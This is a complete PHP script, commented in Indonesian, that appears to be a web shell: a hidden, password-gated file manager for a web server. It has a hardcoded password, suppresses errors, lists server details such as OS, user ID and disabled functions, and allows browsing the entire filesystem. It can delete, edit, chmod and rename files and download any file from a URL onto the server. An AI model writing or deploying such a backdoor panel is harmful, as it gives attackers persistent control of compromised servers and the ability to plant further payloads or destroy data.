<?php
session_start();
error_reporting(0);

// === Konfigurasi ===
$panel_password = 'kucing123';
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if ($path === false) $path = getcwd(); // fallback
chdir($path);

// === Autentikasi ===
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['panel_pass']) && $_POST['panel_pass'] === $panel_password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    echo '<form method="POST"><input type="password" name="panel_pass" placeholder="Password"><button>Login</button></form>';
    exit;
}

// === Fungsi Bantu ===
function formatSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($sizes) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $sizes[$i];
}

function deleteFolderRecursive($folder) {
    foreach (scandir($folder) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = "$folder/$item";
        if (is_dir($path)) {
            deleteFolderRecursive($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($folder);
}

function listFiles($path) {
    $items = scandir($path);
    $folders = [];
    $files = [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (is_dir("$path/$item")) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    natcasesort($folders);
    natcasesort($files);
    return array_merge($folders, $files);
}

// === Aksi File Manager ===
$msg = '';
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if ($target && is_dir($target)) {
        deleteFolderRecursive($target) ? $msg = "Folder deleted." : $msg = "Failed to delete folder.";
    } elseif ($target && file_exists($target)) {
        unlink($target) ? $msg = "File deleted." : $msg = "Failed to delete file.";
    } else {
        $msg = "Target not found.";
    }
} elseif (isset($_POST['upload'])) {
    if (!empty($_FILES['file']['name'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . basename($_FILES['file']['name']));
    } elseif (!empty($_POST['url'])) {
        $url = $_POST['url'];
        $fname = basename(parse_url($url, PHP_URL_PATH));
        file_put_contents("$path/$fname", file_get_contents($url));
    }
} elseif (isset($_POST['create_file'])) {
    file_put_contents("$path/" . $_POST['file_name'], '');
} elseif (isset($_POST['create_folder'])) {
    mkdir("$path/" . $_POST['folder_name']);
} elseif (isset($_POST['edit_file'])) {
    $file_path = realpath($_POST['file_path']);
    if ($file_path && file_exists($file_path)) {
        file_put_contents($file_path, $_POST['file_content']);
        header("Location: ?path=" . urlencode(dirname($file_path)));
        exit;
    } else {
        $msg = "File tidak ditemukan.";
    }
} elseif (isset($_GET['unzip'])) {
    $zipPath = realpath($_GET['unzip']);
    if ($zipPath && file_exists($zipPath)) {
        $zip = new ZipArchive;
        $res = $zip->open($zipPath);
        if ($res === TRUE) {
            $zip->extractTo(dirname($zipPath));
            $zip->close();
            $msg = "Unzipped.";
        } else {
            $msg = "Unzip failed.";
        }
    } else {
        $msg = "File zip tidak ditemukan.";
    }
} elseif (isset($_POST['chmod'])) {
    $target = realpath($_POST['target']);
    if ($target && file_exists($target)) {
        chmod($target, octdec($_POST['perm']));
    }
} elseif (isset($_POST['rename'])) {
    $old_name = realpath($_POST['old_name']);
    if ($old_name && file_exists($old_name)) {
        $new_name = $_POST['new_name'];
        // Pastikan $new_name absolute path
        if (!preg_match('#^/#', $new_name)) {
            $new_name = dirname($old_name) . '/' . $new_name;
        }
        rename($old_name, $new_name);
    }
}

// === Render HTML ===
echo "<style>
    body { background: #111; color: #ddd; font-family: monospace; }
    a { color: #7cf; text-decoration: none; }
    input, button, select, textarea { background: #222; color: #ddd; border: 1px solid #444; padding: 4px; }
    table { 
        width: 100%; 
        border-collapse: collapse; 
        table-layout: fixed; /* Penting supaya kolom rapi */
    }
    th, td { 
        padding: 6px 8px; 
        border-bottom: 1px solid #333; 
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        vertical-align: middle;
    }
    th {
        background: #222;
    }
    th.name, td.name { width: 35%; text-align: left; }
    th.size, td.size { width: 15%; text-align: right; }
    th.perm, td.perm { width: 10%; text-align: center; }
    th.modified, td.modified { width: 25%; text-align: center; }
    th.action, td.action { width: 15%; text-align: center; }

    .actions button { margin-right: 4px; }
    .toolbar { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px; }
    .toolbar form { display: flex; gap: 5px; align-items: center; }
    .info-grid { display: grid; grid-template-columns: max-content auto; gap: 6px 12px; background: #222; padding: 10px; margin-bottom: 10px; border-radius: 8px; }
    textarea { font-family: monospace; }
</style>";

// === Info Server ===
echo "<h2>🖥️ Server Info</h2><div class='info-grid'>";
echo "<div>Server IP:</div><div>" . $_SERVER['SERVER_ADDR'] . "</div>";
echo "<div>OS:</div><div>" . php_uname() . "</div>";
echo "<div>PHP Version:</div><div>" . phpversion() . "</div>";
echo "<div>User:</div><div>" . get_current_user() . " (UID: " . getmyuid() . ")</div>";
echo "<div>Group:</div><div>GID: " . getmygid() . "</div>";
echo "<div>Disabled Funcs:</div><div>" . ini_get('disable_functions') . "</div>";
echo "<div>Extensions:</div><div style='display:flex;flex-wrap:wrap;gap:6px;'>";
foreach (get_loaded_extensions() as $ext) echo "<span>[$ext]</span> ";
echo "</div></div>";

// === Path Navigasi ===
echo "<h3>📁 Dir: ";
$parts = explode('/', trim($path, '/'));
$build = '/';
echo '<a href="?path=/">/</a>';
foreach ($parts as $part) {
    if ($part === '') continue;
    $build .= "$part/";
    echo "<a href='?path=" . urlencode($build) . "'>$part/</a>";
}
echo "</h3>";

// === Toolbar Upload / Create ===
echo "<div class='toolbar'>
<form method='POST' enctype='multipart/form-data'>
  <label>Upload</label>
  <input type='file' name='file'>
  <button name='upload'>Upload</button>
</form>
<form method='POST'>
  <label>URL file</label>
  <input type='text' name='url'>
  <button name='upload'>Upload URL</button>
</form>
<form method='POST'>
  <label>Nama File</label>
  <input type='text' name='file_name'>
  <button name='create_file'>Create File</button>
</form>
<form method='POST'>
  <label>Nama Folder</label>
  <input type='text' name='folder_name'>
  <button name='create_folder'>Create Folder</button>
</form>
</div>";

// === Edit Mode ===
if (isset($_GET['edit'])) {
    $file = realpath($_GET['edit']);
    if ($file === false || !file_exists($file)) {
        echo "<p>File tidak ditemukan.</p>";
        exit;
    }
    echo "<h3>✏️ Edit: $file</h3>
    <form method='POST'>
        <input type='hidden' name='file_path' value='$file'>
        <textarea name='file_content' style='width:100%;height:400px;'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>
        <button name='edit_file'>Simpan</button>
        <a href='?path=" . urlencode(dirname($file)) . "'><button type='button'>Kembali</button></a>
    </form>";
    exit;
}

// === List Files ===
echo "<table><tr>
    <th class='name'>Nama</th>
    <th class='size'>Ukuran</th>
    <th class='perm'>Izin</th>
    <th class='modified'>Modifikasi</th>
    <th class='action'>Aksi</th>
</tr>";
foreach (listFiles($path) as $item) {
    $full = realpath("$path/$item");
    if ($full === false) continue;
    $isDir = is_dir($full);
    $encoded = urlencode($full);
    $perm = substr(sprintf('%o', fileperms($full)), -4);
    echo "<tr><td class='name'>";
    if ($isDir) {
        echo "📁 <a href='?path=$encoded'>$item</a>";
    } else {
        echo "📄 <a href='?edit=$encoded'>$item</a>";
    }
    echo "</td><td class='size'>" . ($isDir ? '-' : formatSize(filesize($full))) . "</td>";
    echo "<td class='perm'>$perm</td>";
    echo "<td class='modified'>" . date('Y-m-d H:i:s', filemtime($full)) . "</td>";
    echo "<td class='action'>";

    // Dropdown Action
    echo "<form method='POST' onsubmit='return false;' id='form_$encoded'>
        <input type='hidden' name='old_name' value='$full'>
        <input type='hidden' name='target' value='$full'>
        <select onchange='handleAction(this, \"$encoded\", \"$item\", " . ($isDir ? 'true' : 'false') . ")'>
            <option value=''>-- Pilih Aksi --</option>";
    if (!$isDir) {
        echo "<option value='edit'>Edit</option>";
        if (pathinfo($item, PATHINFO_EXTENSION) === 'zip') {
            echo "<option value='unzip'>Unzip</option>";
        }
    }
    // chmod selalu muncul baik folder maupun file
    echo "<option value='chmod'>Chmod</option>";
    echo "<option value='rename'>Rename</option>";
    echo "<option value='delete'>Delete</option>";
    echo "</select></form>";
    echo "</td></tr>";
}
echo "</table>";

// JavaScript handler
echo <<<JS
<script>
function handleAction(select, id, name, isDir) {
    let form = document.getElementById('form_' + id);
    let action = select.value;

    if (action === 'edit') {
        window.location = '?edit=' + encodeURIComponent(form.old_name.value);
    } else if (action === 'unzip') {
        window.location = '?unzip=' + encodeURIComponent(form.target.value);
    } else if (action === 'delete') {
        if (confirm("Yakin ingin menghapus " + name + "?")) {
            window.location = '?delete=' + encodeURIComponent(form.old_name.value);
        }
    } else if (action === 'rename') {
        let newName = prompt("Ganti nama:", name);
        if (newName) {
            let input = document.createElement("input");
            input.type = "hidden";
            input.name = "new_name";
            input.value = form.old_name.value.replace(/\/[^/]+$/, '/' + newName);
            form.appendChild(input);
            form.submit();
        }
    } else if (action === 'chmod') {
        let perm = prompt("Ubah permission (cth: 0755):", "0755");
        if (perm) {
            let input = document.createElement("input");
            input.type = "hidden";
            input.name = "perm";
            input.value = perm;
            form.appendChild(input);
            form.submit();
        }
    }
    select.value = ""; // Reset pilihan
}
</script>
JS;
if ($msg) echo "<p>$msg</p>";
?>
